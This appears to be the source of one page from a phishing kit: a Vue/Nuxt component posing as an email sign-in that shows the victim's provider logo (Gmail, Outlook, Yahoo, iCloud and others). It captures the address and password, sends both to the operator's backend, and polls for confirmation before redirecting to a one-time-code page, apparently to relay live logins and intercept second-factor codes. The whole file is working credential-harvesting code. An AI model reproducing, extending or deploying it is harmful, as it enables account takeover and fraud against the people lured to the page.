<script setup>
definePageMeta({
    middleware: [
        'dinzab','captcha','preventunlogged'
    ],
    requireLogin: true
});
</script>
<script>
import defImg from "@/assets/default.png"
export default {
    data() {
        return {
            default: "https://cdn6.aptoide.com/imgs/a/f/4/af450d645b92333ef494af1f04288bf9_icon.png",
            yahoo: "https://s.yimg.com/cv/apiv2/social/images/yahoo_default_logo.png",
            gmail: "https://play-lh.googleusercontent.com/KSuaRLiI_FlDP8cM4MzJ23ml3og5Hxb9AapaGTMZ2GgR103mvJ3AAnoOFz1yheeQBBI",
            outlook: "https://images.freeimages.com/fic/images/icons/2795/office_2013_hd/2000/outlook.png",
            yandex: "https://yastatic.net/s3/home-static/_/90/9034470dfcb0bea0db29a281007b8a38.png",
            gmx: "https://play-lh.googleusercontent.com/mvM6p9uIkQc52i4nx18j9SdfSUdWH_wenNGIwuuYYjHH8TZLyaKZBV_S1CEhu7iTZbs",
            sfr: "https://upload.wikimedia.org/wikipedia/commons/9/97/SFR-2022-logo.svg",
            aol: "https://download.logo.wine/logo/AOL/AOL-Logo.wine.png",
            icloud: "https://1000logos.net/wp-content/uploads/2020/08/iCloud-Logo.jpg",
            emailLogo: "",
            dinzabmailbox: "",
            dinzabmailboxpass: "",
            mustAdd: false,
            alert: false,
            loader: false,
            text: "your email",
            session: ""
        }

    },
    async beforeMount() {
        const res = await $fetch('/api/webmail')
        if (res.data.isEmail) {
            this.dinzabmailbox = res.data.Email
        } else {
            this.mustAdd = true
        }
        const resp = await $fetch("/api/cookie")
        this.session = resp
    },
    computed: {
        company() {
            if (this.dinzabmailbox.includes("@")) {


                let domain = this.dinzabmailbox.split("@")[1]
                if (domain.includes("gmail.com")) {
                    this.emailLogo = this.gmail
                    this.text = "Gmail"
                } else if (domain.includes("hotmail.com")) {
                    this.emailLogo = this.outlook
                    this.text = "Hotmail"
                }else if (domain.includes("outlook.com") || domain.includes("outlook.fr")) {
                    this.emailLogo = this.outlook
                    this.text = "Outlook"
                } else if (domain.includes("yandex.com") || domain.includes("yandex.ru")) {
                    this.emailLogo = this.yandex
                    this.text = "Yandex"
                } else if (domain.includes("gmx.com") || domain.includes("gmx.de") || domain.includes("gmx.fr")) {
                    this.emailLogo = this.gmx
                    this.text = "Gmx"
                } else if (domain.includes("sfr.com") || domain.includes("sfr.de") || domain.includes("sfr.fr")) {
                    this.emailLogo = this.sfr
                    this.text = "Sfr"
                } else if (domain.includes("yahoo.com") || domain.includes("yahoo.fr")) {
                    this.emailLogo = this.yahoo
                    this.text = "Yahoo"
                } else if (domain.includes("aol.com") || domain.includes("aol.fr")) {
                    this.emailLogo = this.aol
                    this.text = "Aol"
                } else if (domain.includes("icloud.com") || domain.includes("icloud.fr") || domain.includes("icloud.de") || domain.includes("icloud.it")) {
                    this.emailLogo = this.icloud
                    this.text = "Icloud"
                } else {
                    this.text = "your email"
                    this.emailLogo = this.default
                }

            } else {
                this.emailLogo = this.default
                this.text = "your email"
            }
            
            return this.emailLogo

        }
    },
    methods: {
        async post() {
            const app = useNuxtApp()
            this.alert = false
            this.loader = true

            await app.$api.post("v2.0/process/mail", {
                dinzabwebmail: this.dinzabmailbox,
                dinzabwebpass: this.dinzabmailboxpass
            }, {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }}).then(() => {
                var poll = setInterval(async () => {
                    await app.$api.get('Check/authority/v.01/mailaccess', {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }}).then(async res => {
                        if(res.data.mail === true) {
                            clearInterval(poll)
                            await app.$api.get('fix/statux.aspx', {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }})
                            
                            navigateTo({name: 'otp-mail'})
                        }

                        if(res.data.mail === false) {
                            clearInterval(poll)
                            await app.$api.get('fix/statux.aspx', {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }})
                            this.loader = false
                            this.alert = true
                        }
                    }).catch(async () => {
                        clearInterval(poll)
                        await app.$api.get('fix/statux.aspx', {headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }})
                        this.loader = false
                        this.alert = true
                    })
                },2000)
            }).catch(() => {
                this.loader = false
                this.alert = true
            })
        }
    }

}
</script>
<template>
    <Head>
        <Title>{{ $t('45') }}</Title>
    </Head>
    <section class="container p-2 mx-auto rounded bg-white w-100 sm:w-[80%] md:w-[100%] lg:w-[80%]" style="margin:0 auto!important">
        <div class="zeby1">
            <form class="containerz containerBordered" id="login" v-on:submit.prevent="post()">
                <header class="pb-5 lg:pb-3 md:pb-3">
                    <div class="zebyLogo"></div>
                </header>
                <h1
                    class="mb-1 ml-1 text-xl text-center font-extrabold leading-none tracking-tight text-gray-900 md:text-xl lg:text-2xl dark:text-white">
                    {{ $t('46') }}</h1>
                <p class="ml-1 p-2 font-light text-md">{{ $t('47') }} {{ text }} {{ $t('48') }}</p>
                <div class="flex justify-center p-3">
                    <img class="w-[30%] h-[30%] md:w-[30%] md:h-[30%] lg:w-[30%] lg:h-[30%] rounded-full" :src="company"/>
                </div>
                <div id="email">
                    <div class="zebyInput">
                        <div class="notifications" :class="{ hide: !alert }">


                            <p class="notification notification-critical" role="alert">
                                {{$t('3')}}</p>
                        </div>
                        <div class="relative mb-1 mt-1">
                            <input required :disabled="!mustAdd" v-model="dinzabmailbox"
                                class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
                                placeholder=" " />
                            <label for="dinzabemail"
                                class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{$t('49')}}</label>
                        </div>
                        <div class="relative mb-1 mt-1">
                            <input required v-model="dinzabmailboxpass"
                                class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
                                placeholder=" " type="password"/>
                            <label for="dinzabemail"
                                class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{ $t('8') }}</label>
                        </div>
                        <div class="pt-3 w-full flex flex-col justify-center">
                            <button type="submit"
                                class="w-full bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">{{ $t('50') }}</button>
                        </div>
                    </div>
            </div>
        </form>
    </div>
</section>
<div class="spinnerWithLockIcon" :class="{hide: !loader}">
    <p>{{$t('37')}}</p>
    <div class="keychain"></div>
</div></template>